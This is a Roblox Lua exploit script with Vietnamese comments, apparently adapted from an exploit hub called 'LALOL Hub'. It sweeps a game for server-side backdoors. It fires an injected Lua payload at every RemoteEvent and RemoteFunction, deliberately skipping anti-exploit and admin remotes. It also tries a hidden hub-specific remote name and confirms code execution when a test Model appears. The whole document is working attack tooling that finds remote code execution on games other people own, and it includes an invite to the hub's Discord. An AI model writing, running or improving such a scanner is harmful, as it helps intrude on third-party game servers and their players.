-- Script Check Backdoor (Logic Extracted from LALOL Hub Source)
-- Credits: Logic extracted from user provided file, rewritten for headless scanning.

local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

-- Hàm thông báo qua StarterGui
local function sendNotification(title, text)
    StarterGui:SetCore("SendNotification", {
        Title = title,
        Text = text,
        Duration = 10
    })
end

local function scanForBackdoor()
    local startTime = os.clock()
    local foundBackdoor = nil
    local trackedRemotes = {} -- Lưu mã code -> remote tương ứng
    
    -- Tạo danh sách các remote cần kiểm tra
    local candidates = {}
    
    -- 1. Kiểm tra "Protected Backdoor" cụ thể của LALOL Hub (Logic từ dòng 469 trong file gốc)
    -- Nó tính toán tên remote dựa trên PlaceId
    local hiddenName = 'lh' .. (game.PlaceId / 6666 * 1337 * game.PlaceId)
    local protectedRemote = ReplicatedStorage:FindFirstChild(hiddenName)
    if protectedRemote and protectedRemote:IsA("RemoteFunction") then
        table.insert(candidates, {Remote = protectedRemote, IsProtected = true})
    end

    -- 2. Quét toàn bộ game để tìm các RemoteEvent/RemoteFunction khác
    for _, remote in pairs(game:GetDescendants()) do
        if remote:IsA("RemoteEvent") or remote:IsA("RemoteFunction") then
            
            -- === BỘ LỌC (FILTER) ===
            -- Logic lọc các remote an toàn/hệ thống dựa trên file gốc (Dòng 480-515)
            
            -- Bỏ qua RobloxReplicatedStorage
            if string.find(remote:GetFullName(), "RobloxReplicatedStorage") then continue end
            
            -- Bỏ qua ADONIS Anti-Exploit
            if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then continue end
            
            -- Bỏ qua HD Admin
            if remote.Parent and remote.Parent.Parent and remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then continue end
            
            -- Bỏ qua Chat Events
            if remote.Parent and remote.Parent.Name == 'DefaultChatSystemChatEvents' then continue end
            
            -- Nếu remote hợp lệ, thêm vào danh sách
            table.insert(candidates, {Remote = remote, IsProtected = false})
        end
    end

    -- 3. Gửi Payload kiểm tra (Firing)
    -- Tạo một Model có tên ngẫu nhiên trong Workspace. Nếu Model xuất hiện -> Remote đó là Backdoor.
    for _, data in pairs(candidates) do
        local remote = data.Remote
        local code = "BDCHECK_" .. math.random(100000, 999999) .. "_" .. math.random(100,999)
        trackedRemotes[code] = remote
        
        -- Script tạo Model để verify (Payload từ dòng 522 file gốc)
        local payload = "a=Instance.new('Model',workspace)a.Name='"..code.."'"

        task.spawn(function()
            -- Sử dụng pcall để tránh script bị dừng nếu remote bị lỗi
            pcall(function()
                if data.IsProtected then
                    -- Logic gọi đặc biệt cho remote của LALOL Hub
                    remote:InvokeServer('lalol hub join today!! discord.gg/XXqzxT7E5z', payload)
                else
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer(payload)
                    elseif remote:IsA("RemoteFunction") then
                        remote:InvokeServer(payload)
                    end
                end
            end)
        end)
    end

    -- 4. Chờ và Kiểm tra kết quả (Scanning)
    -- Đợi tối đa 3 giây để server phản hồi
    local waitTime = 3
    local startWait = os.clock()
    
    while os.clock() - startWait < waitTime do
        for code, remote in pairs(trackedRemotes) do
            local checkObject = Workspace:FindFirstChild(code)
            if checkObject then
                foundBackdoor = remote
                checkObject:Destroy() -- Xóa vật thể kiểm tra
                break
            end
        end
        
        if foundBackdoor then break end
        task.wait(0.1)
    end

    -- 5. Tính toán thời gian và Thông báo
    local endTime = os.clock()
    local totalTime = endTime - startTime
    
    if foundBackdoor then
        -- FOUND
        local path = foundBackdoor:GetFullName()
        warn("BACKDOOR FOUND: " .. path)
        sendNotification(
            "BACKDOOR FOUND",
            string.format("Path: %s\nTime: %.5f (second)", path, totalTime)
        )
    else
        -- NOT FOUND
        warn("BACKDOOR NOT FOUND")
        sendNotification(
            "BACKDOOR NOT FOUND",
            string.format("Path: nil\nTime: %.5f (second)", totalTime)
        )
    end
end

-- Chạy hàm quét
scanForBackdoor()
